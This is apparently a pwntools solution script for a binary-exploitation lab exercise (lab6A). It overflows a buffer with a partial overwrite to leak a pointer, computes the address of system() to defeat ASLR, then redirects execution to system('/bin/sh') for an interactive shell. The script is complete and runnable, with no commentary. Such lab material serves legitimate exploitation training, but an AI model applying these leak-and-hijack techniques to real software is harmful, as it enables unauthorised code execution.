from pwn import *
import struct

while True:
    r = process("/levels/lab06/lab6A")
    
    r.sendline("1")
    r.send("A" * 32)
    r.send("B" * 90 + "\xe2\x0b")
    r.recv()
    r.sendline("3")

    try:
        leak = r.recv()
    except EOFError:
            log.warn("Retrying...")
            continue

    print_name = struct.unpack('<I', leak[170:174])[0]
    system_addr = print_name - 0x19da52
    log.info("address of system: {}".format(hex(system_addr)))

    r.sendline("1")
    r.send("/bin/sh\x00")
    r.send("B" * 115 + p32(system_addr))
    r.sendline("3")

    r.interactive()
    break
